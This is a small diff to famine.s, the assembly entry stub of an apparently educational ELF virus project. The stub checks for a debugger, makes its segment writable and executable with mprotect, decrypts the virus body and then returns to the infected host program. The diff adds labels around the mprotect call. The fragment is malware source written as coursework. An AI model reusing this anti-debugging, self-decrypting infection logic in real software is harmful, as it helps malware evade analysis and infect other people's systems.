@@ -1,14 +1,3 @@
-; **************************************************************************** ;
-;                                                                              ;
-;                                                         :::      ::::::::    ;
-;    famine.s                                           :+:      :+:    :+:    ;
-;                                                     +:+ +:+         +:+      ;
-;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
-;                                                 +#+#+#+#+#+   +#+            ;
-;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/20 23:34:02 by anselme          ###   ########.fr        ;
-;                                                                              ;
-; **************************************************************************** ;
 
 %define SYSCALL_WRITE		0x01
 %define SYSCALL_EXIT		0x3c
@@ -23,7 +12,10 @@ section .text
 	global mark_below
 	global return_to_client
 
-extern _start
+	global mprotect_call
+	global mprotect_end
+extern detect_spy
+extern decypher
 extern virus
 extern decypher
 extern detect_spy
@@ -104,6 +96,7 @@ mark_below:
 	test rax, rax
 	jnz return_to_client
 ;------------------------------; make ptld writable
+mprotect_call:
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
 
@@ -114,6 +107,7 @@ mark_below:
 	mov rdx, PROT_RWX
 	mov rax, SYSCALL_MPROTECT
 	syscall
+mprotect_end:
 ;------------------------------; decypher virus
 	mov rdi, [rsp + 16]        ; get virus_addr
 	mov rsi, r14               ; get virus_size
